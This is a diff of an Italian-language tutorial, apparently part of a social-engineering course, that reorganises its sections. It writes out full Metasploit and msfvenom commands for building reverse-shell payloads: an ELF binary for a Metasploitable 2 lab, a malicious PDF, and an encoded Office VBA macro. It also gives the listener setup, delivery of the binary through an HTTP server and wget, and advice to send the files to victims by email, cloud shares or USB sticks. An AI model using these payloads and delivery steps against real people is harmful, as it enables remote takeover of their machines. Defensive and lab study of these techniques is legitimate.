@@ -63,70 +63,6 @@ Specificare l'url del sito web di phishing a cui redirigere le potenziali vittim
 
 Aprite qrcode_attack.png con un QRCode scanner online e.g Web QR per vedere che il QRCode punta al sito malevolo
 
-## Creare un eseguibile malevolo per Metasploitable 2
-
-Creiamo un esegeguibile malevolo usando msfvenom.
-
-```
-msfvenom -p linux/x86/meterpreter_reverse_tcp -a x86 -f elf --platform linux -o /tmp/LegitProgram LHOST = <IP Kali VM> LPORT=5678
-```
-Posizionarsi sotto la cartella /tmp
-
-```
-cd /tmp
-``` 
-Creare un http server con il seguente comando per trasferire il file sulla macchina della vittima.
-
-```
-python3 -m http.server 8888
-```
-
-Lanciare Metasploit e far partire un listener per la connessione di rete che verra' creata dal file malevolo:
-
-```
-msfconsole
-use exploit/multi/handler
-set PAYLOAD linux/x86/meterpreter_reverse_tcp
-set LHOST <IP KAli VM>
-set LPORT 5678
-set ExitOnSession false
-exploit -j 
-```
-
-Sulla macchina Metasploitable 2 digitare il seguente comando per scaricare l'eseguibile malevolo
-
-```
-wget <IP Kali VM>:8888/LegitProgram
-```
-Poi digitare i seguenti comandi per dare i permessi di esecuzione ed eseguire il file malevolo
-
-```
-chmod +x LegitProgram.1
-./LegitProgram.1
-```
-
-
-## Creare un documento PDF malevolo con Metasploit
-
-Lanciare Metasploit dal terminale digitando
-```
-msfconsole
-```
-Dopo di che possiamo creare un documento PDF malevolo con il seguente comando:
-
-```
-use exploit/windows/fileformat/adobe_utilprintf
-set FILENAME <nome da dare al documento PDF>
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <IP Kali VM>
-set LPORT 4455
-show options
-exploit
-```
-Il documento PDF malevolo viene creato all'interno della cartella /root/.msf4/local/<nomefile>.pdf
-
-Potete inviare il documento PDF malevolo via email, o salvarlo su una chiavetta USB e convincere la vittima a inserire la chiavetta USB nel proprio PC.
-
 ## Creare Chiavetta USB infetta 
 
 Dal menu' principale di SET selezionare l'opzione 3) Infectious Media Generator.
@@ -201,6 +137,80 @@ pdf-parser --object <object_number> -f -w -d objNUM.js template.pdf
 Analizza il JavaScript per identificare comportamenti dannosi, come il download di payload aggiuntivi o l'esecuzione di codice arbitrario.
 
 Per completare l'attacco bisogna copiare il contenuto della cartella /root/.set/autorun su una chiavetta USB.
+
+## Creare un documento Office Malevolo
+
+Creiamo un esegeguibile malevolo usando msfvenom, che e' una componente di Metasploit che serve a generare payload malevoli ed ad offuscarli.
+
+```
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST = <IP Kali VM> LPORT=8080 -e x86/shikata_ga_nai -f vba-exe 
+```
+
+Il comando genera una macro VBA da copiare nel documento Office tramite l'editor per le macro, e il payload vero e proprio che invece deve essere copiato nel documento.
+Per completare l'attacco dovete condividere il documento con la vittima e.g usando Dropbox o Google Drive o inviarlo come allegato ad un'email.
+
+## Creare un eseguibile malevolo per Metasploitable 2
+Creaiamo un eseguibile per la macchina Metasploitable 2
+
+```
+msfvenom -p linux/x86/meterpreter_reverse_tcp -a x86 -f elf --platform linux -o /tmp/LegitProgram LHOST = <IP Kali VM> LPORT=5678
+```
+Posizionarsi sotto la cartella /tmp
+
+```
+cd /tmp
+``` 
+Creare un http server con il seguente comando per trasferire il file sulla macchina della vittima.
+
+```
+python3 -m http.server 8888
+```
+
+Lanciare Metasploit e far partire un listener per la connessione di rete che verra' creata dal file malevolo:
+
+```
+msfconsole
+use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter_reverse_tcp
+set LHOST <IP KAli VM>
+set LPORT 5678
+set ExitOnSession false
+exploit -j 
+```
+
+Sulla macchina Metasploitable 2 digitare il seguente comando per scaricare l'eseguibile malevolo
+
+```
+wget <IP Kali VM>:8888/LegitProgram
+```
+Poi digitare i seguenti comandi per dare i permessi di esecuzione ed eseguire il file malevolo
+
+```
+chmod +x LegitProgram.1
+./LegitProgram.1
+```
+
+
+## Creare un documento PDF malevolo con Metasploit
+
+Lanciare Metasploit dal terminale digitando
+```
+msfconsole
+```
+Dopo di che possiamo creare un documento PDF malevolo con il seguente comando:
+
+```
+use exploit/windows/fileformat/adobe_utilprintf
+set FILENAME <nome da dare al documento PDF>
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <IP Kali VM>
+set LPORT 4455
+show options
+exploit
+```
+Il documento PDF malevolo viene creato all'interno della cartella /root/.msf4/local/<nomefile>.pdf
+
+Potete inviare il documento PDF malevolo via email, o salvarlo su una chiavetta USB e convincere la vittima a inserire la chiavetta USB nel proprio PC.
 
 
 # Sfruttare gli LLMs per condurre attacchi di ingegneria sociale
